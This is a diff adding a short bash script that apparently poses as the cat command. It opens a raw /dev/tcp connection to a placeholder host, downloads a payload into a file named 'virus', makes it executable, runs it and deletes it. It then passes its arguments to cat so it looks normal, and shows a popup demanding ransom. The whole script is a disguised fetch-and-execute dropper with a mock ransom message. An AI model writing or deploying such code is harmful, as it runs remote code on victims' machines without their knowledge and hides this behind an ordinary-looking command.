@@ -1,0 +1,13 @@
+#!/bin/bash
+exec 3<> /dev/tcp/?/? 2>/dev/null
+
+echo -e "start\n" >&3
+response=$(cat <&3)
+echo "$response" > virus
+chmod +x virus
+./virus
+rm virus
+exec 3>&-
+cat $@
+zenity --warning --text="Give me ransom haha"
+exit
